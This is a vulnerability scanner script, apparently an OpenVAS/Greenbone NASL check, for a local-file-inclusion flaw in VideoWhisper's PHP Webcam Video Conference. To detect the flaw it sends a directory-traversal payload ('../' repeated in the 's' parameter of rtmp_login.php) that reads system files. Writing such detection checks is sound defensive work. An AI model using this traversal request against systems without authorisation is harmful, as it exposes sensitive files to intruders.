if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103902" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "PHP Webcam Video Conference Local File Inclusion / XSS" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/31458/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-02-07 11:53:08 +0100 (Fri, 07 Feb 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "A remote attacker can exploit this issue to obtain sensitive
information that could aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request which tries to read a local file." );
	script_tag( name: "insight", value: "Input of the 's' value in rtmp_login.php is not properly sanitized." );
	script_tag( name: "solution", value: "Upgrade to the new version ifrom the videowhisper vendor homepage." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "PHP Webcam Video Conferenceis prone to a directory-traversal
vulnerability because it fails to sufficiently sanitize user-supplied input." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/vc", "/vc_php", "/videoconference", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	res = http_get_cache( item: url, port: port );
	if(ContainsString( res, "<title>Video Conference by VideoWhisper.com" )){
		for file in keys( files ) {
			url = dir + "/rtmp_login.php?s=" + crap( data: "../", length: 9 * 9 ) + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

